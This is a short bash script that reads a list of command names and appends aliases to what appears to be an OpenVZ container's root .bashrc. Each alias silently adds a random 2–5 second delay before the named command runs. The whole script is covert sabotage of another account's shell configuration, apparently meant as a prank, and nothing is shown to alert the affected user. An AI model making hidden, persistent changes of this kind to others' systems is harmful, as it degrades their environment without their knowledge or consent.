#!/bin/bash

file="/home/hp/scripts/commands.txt"

cat $file | while read LINE
do
	num=$(( $RANDOM % 4 + 2))
	echo "alias $LINE='sleep $num;$LINE'" >> /../../vz/private/102/root/.bashrc
done
